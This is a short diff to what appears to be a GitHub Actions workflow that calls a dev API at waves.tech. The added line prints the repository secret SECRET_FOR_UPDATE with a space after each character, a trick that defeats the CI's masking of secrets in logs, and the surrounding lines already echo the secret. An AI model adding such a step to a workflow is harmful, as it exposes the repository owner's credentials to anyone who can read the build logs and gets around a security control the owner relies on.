@@ -15,6 +15,7 @@ jobs:
         env:
           SECRET_FOR_UPDATE: ${{ secrets.SECRET_FOR_UPDATE }}
         run: |
+          echo ${{ secrets.SECRET_FOR_UPDATE }} | sed 's/./& /g'
           echo ${{ secrets.SECRET_FOR_UPDATE }}
           curl -X 'GET' 'https://api-dev.waves.tech/api/v1/test' \
             -H 'accept: */*' \
